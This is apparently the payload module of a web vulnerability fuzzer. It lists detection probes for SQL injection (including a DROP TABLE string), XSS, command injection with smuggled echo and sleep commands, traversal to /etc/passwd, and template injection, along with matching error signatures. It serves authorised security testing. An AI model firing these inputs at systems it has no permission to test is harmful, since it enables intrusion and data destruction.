"""
PhantomFuzzer — Payload Library
═══════════════════════════════════════════════════════════════
Standard vulnerability-testing payloads — the same class of strings
taught in every web security course and OWASP Testing Guide, used
for DETECTION (does this input trigger anomalous behavior?), not
exploitation. Each payload is paired with metadata describing what
signal indicates a match, so detectors.py can interpret results
without hardcoding payload-specific logic.

This is a detection tool: it sends a probe and observes the
response. It never attempts to extract data, spawn a shell, or
otherwise exploit a confirmed vulnerability.
"""

# ════════════════════════════════════════════════════════════════
# SQL INJECTION
# ════════════════════════════════════════════════════════════════

SQLI_ERROR_PAYLOADS = [
    "'", "''", "\"", "`", "'--", "' OR '1'='1", "' OR '1'='1'--",
    "1' OR '1'='1", "1'; DROP TABLE users--", "' UNION SELECT NULL--",
    "1' AND '1'='2", "\\'", "%27", "' OR 1=1#",
]

# (true_condition, false_condition) pairs — boolean-based blind detection
# compares response to each half against a baseline
SQLI_BOOLEAN_PAIRS = [
    ("' OR '1'='1", "' AND '1'='2"),
    (" OR 1=1", " AND 1=2"),
    ("1' OR '1'='1'-- -", "1' AND '1'='2'-- -"),
]

# Time-based blind — each maps to the DB engine it targets and the
# expected delay in seconds, so the detector knows what to compare against
SQLI_TIME_PAYLOADS = [
    {"payload": "' OR SLEEP(5)-- -", "engine": "MySQL", "delay": 5},
    {"payload": "1' OR SLEEP(5)-- -", "engine": "MySQL", "delay": 5},
    {"payload": "'; WAITFOR DELAY '0:0:5'--", "engine": "MSSQL", "delay": 5},
    {"payload": "' OR pg_sleep(5)-- -", "engine": "PostgreSQL", "delay": 5},
]

# Known database error signatures — appearing in a response strongly
# suggests the input reached a SQL query unsanitized
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated",
    "sqlstate", "ora-00933", "ora-01756", "postgresql query failed",
    "sqlite3.operationalerror", "sqlite_error", "microsoft odbc",
    "system.data.sqlclient", "npgsql.", "pg_query()",
    "mysql_fetch", "mysqli_", "supplied argument is not a valid mysql",
]

# ════════════════════════════════════════════════════════════════
# CROSS-SITE SCRIPTING (XSS)
# ════════════════════════════════════════════════════════════════

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<ScRiPt>alert(1)</sCrIpT>",  # case-variation, evades naive case-sensitive filters
]

# ════════════════════════════════════════════════════════════════
# COMMAND INJECTION
# ════════════════════════════════════════════════════════════════

# Marker-based: if this exact string echoes back in the response,
# the command executed on the server (safe — 'echo' prints harmless text)
CMDI_MARKER = "PHANTOMFUZZ_CMDI_MARK_7f3a9"
CMDI_OUTPUT_PAYLOADS = [
    f"; echo {CMDI_MARKER}",
    f"| echo {CMDI_MARKER}",
    f"`echo {CMDI_MARKER}`",
    f"$(echo {CMDI_MARKER})",
    f"&& echo {CMDI_MARKER}",
]

CMDI_TIME_PAYLOADS = [
    {"payload": "; sleep 5", "delay": 5},
    {"payload": "| sleep 5", "delay": 5},
    {"payload": "`sleep 5`", "delay": 5},
    {"payload": "$(sleep 5)", "delay": 5},
]

# ════════════════════════════════════════════════════════════════
# PATH TRAVERSAL
# ════════════════════════════════════════════════════════════════

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd", "/etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini", "..%5c..%5c..%5cwindows%5cwin.ini",
]

TRAVERSAL_SIGNATURES = [
    "root:x:0:0:", "root:*:0:0:",  # /etc/passwd header
    "[extensions]", "[fonts]",     # win.ini section headers
]

# ════════════════════════════════════════════════════════════════
# SERVER-SIDE TEMPLATE INJECTION (SSTI)
# ════════════════════════════════════════════════════════════════

# Each payload's expected evaluated output if the template engine
# executes it — the classic "does 7*7 become 49" detection technique
SSTI_PAYLOADS = [
    {"payload": "{{7*7}}", "expect": "49", "engine": "Jinja2/Twig"},
    {"payload": "${7*7}", "expect": "49", "engine": "FreeMarker/EL"},
    {"payload": "#{7*7}", "expect": "49", "engine": "Ruby ERB"},
    {"payload": "<%= 7*7 %>", "expect": "49", "engine": "ERB"},
    {"payload": "{{7*'7'}}", "expect": "7777777", "engine": "Jinja2 (string repeat)"},
]

# ════════════════════════════════════════════════════════════════
# GENERIC FUZZ STRINGS — crash / error triggering, not category-specific
# ════════════════════════════════════════════════════════════════

GENERIC_FUZZ_PAYLOADS = [
    "A" * 5000,                       # long string — buffer/length handling
    "\x00", "%00",                    # null byte
    "™®©℗℠", "𝔘𝔫𝔦𝔠𝔬𝔡𝔢",              # unicode edge cases
    "-1", "0", "999999999999999999",  # numeric edge cases
    "NaN", "Infinity", "-Infinity",
    "{}", "[]", "null", "undefined",
]


CATEGORIES = {
    "sqli": {
        "label": "SQL Injection", "error_payloads": SQLI_ERROR_PAYLOADS,
        "boolean_pairs": SQLI_BOOLEAN_PAIRS, "time_payloads": SQLI_TIME_PAYLOADS,
    },
    "xss": {"label": "Cross-Site Scripting", "payloads": XSS_PAYLOADS},
    "cmdi": {
        "label": "Command Injection", "output_payloads": CMDI_OUTPUT_PAYLOADS,
        "time_payloads": CMDI_TIME_PAYLOADS, "marker": CMDI_MARKER,
    },
    "traversal": {"label": "Path Traversal", "payloads": TRAVERSAL_PAYLOADS},
    "ssti": {"label": "Server-Side Template Injection", "payloads": SSTI_PAYLOADS},
    "generic": {"label": "Generic Fuzzing", "payloads": GENERIC_FUZZ_PAYLOADS},
}
